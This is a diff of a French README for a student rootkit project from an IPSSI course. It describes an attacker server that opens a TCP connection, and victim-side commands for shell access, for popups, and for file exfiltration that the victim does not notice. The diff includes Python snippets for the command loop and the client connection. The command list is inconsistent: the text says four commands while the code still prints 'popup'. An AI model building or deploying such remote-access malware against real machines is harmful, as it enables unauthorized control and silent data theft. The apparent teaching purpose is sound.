@@ -10,9 +10,13 @@
 
 <!-- --------------------------- -->
 
+
 **Rootkit-Python-IPSSI** a été réalisé dans le cadre pédagogique de l'IPSSI avec un projet sur 1,5 jours. 
 
 >Un rootkit est un package de logiciels malveillants conçu pour permettre à un intrus d'obtenir un accès non autorisé à un ordinateur ou à un réseau. **Il permet une exécution de code à distance.**
+
+**Pour un meilleur confort, veuillez vous rendre sur https://github.com/IPSSI-Jean/Virus-Python-IPSSI pour avoir une vue globale sur le projet et sur l'affichage du README**
+
 
 # Prérequis
 - Visual studio code
@@ -36,7 +40,7 @@ Le projet repose sur 2 fichiers Python et 1 fichier de test :
 
 - ```Serveur-Attaquant.py``` --> Qui contient le code serveur ( attaquant ) qui ouvrira connection TCP.
 
-- ```test.txt``` --> Pour tester l'exfiltration de fichiers. ( a placer quelque part sur le système )
+- ```test.txt``` --> Pour tester l'exfiltration de fichiers.
 
 ### Fonctionnement du projet
 
@@ -53,7 +57,6 @@ Plusieurs commandes sont possibles depuis le serveur attaquant :
 - **exit** : Arrête le malware coté victime
 - **recv_archive** : Exfiltre des fichiers depuis la victime en les copiant, la victime ne voit rien.
 - **help** : Liste les commandes possibles
-- **popup** : Déclanche une popup chez la victime
 
 ### Mise en réseau
 Ce projet se déroule entièrement en **local**.
@@ -95,12 +98,11 @@ def __init__(self, SHELL_PYTHON):
 ```
 La première fonction **verification** permet de définir les commandes côté attaquant, afin de contrôler la victime, 
 
->Pour rappel il y a 5 commandes :
+>Pour rappel il y a 4 commandes :
 >- **shell** : Pour avoir accès au shell de la victime
 >- **exit** : Arrête le malware coté victime
 >- **recv_archive** : Exfiltre des fichiers depuis la victime en les copiant, la victime ne voit rien.
 >- **help** : Liste les commandes possibles
->- **popup** : Déclanche une popup chez la victime
 
 ```python
 def verifications(SHELL_PYTHON):
@@ -214,7 +216,10 @@ Lorsque ```CTRL+C``` est déclanché, cela coupe le shell.
 ```python
 while True:
     try:
-        shell_btnt = str(input("\033[31m\033[1mCommande\033[31m>>\033[1;32m "))
+        shell_btnt = str(input("\033[31m\033[1m[Commande]\033[31m >>\033[1;32m "))
+        print("")
+        print("Commandes possibles : shell, exit, recv_archive, help, popup")
+        print("")
         Shell.verifications(shell_btnt)
     except KeyboardInterrupt:
         conn.close()
@@ -287,7 +292,7 @@ def send_archive(DATA):
     s.close()
 ```
 
-La troisième fonction **popup** permet l'affichage d'une popup côté client, l'action déclanché par l'attaquant. L'affichage se réalise 5 fois.
+La troisième fonction **popupclient** permet l'affichage d'une popup côté client, l'action déclanché par l'attaquant. L'affichage se réalise 5 fois.
 
 ```python
     #Popupclient client
@@ -323,15 +328,19 @@ Permet d'initialiser la réception des mots envoyés par l'attaquant.
 Lorsque ```CTRL+C``` est déclanché, cela coupe le shell.
 
 ```python
-while True:
-    try:
-        rcvc = s.recv(1024)
-        Client.verifications(rcvc)
-    except KeyboardInterrupt:
-        s.close()
-        exit()
+IP = socket.gethostbyname("localhost")
+PORT = 80
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((IP, int(PORT)))
+s.send("\n".encode("latin1"))
+s.send("Connexion établie avec le client.".encode("latin1"))
+s.send("\n".encode("latin1"))
+s.send("\n".encode("latin1"))
+s.send("Commandes possibles : shell, exit, recv_archive, help, popup".encode("latin1"))
+s.send("\n".encode("latin1"))
+s.send("CTRL+C pour exit le shell".encode("latin1"))
+s.send("\n".encode("latin1"))
 ```
-
 
 # Auteur
 
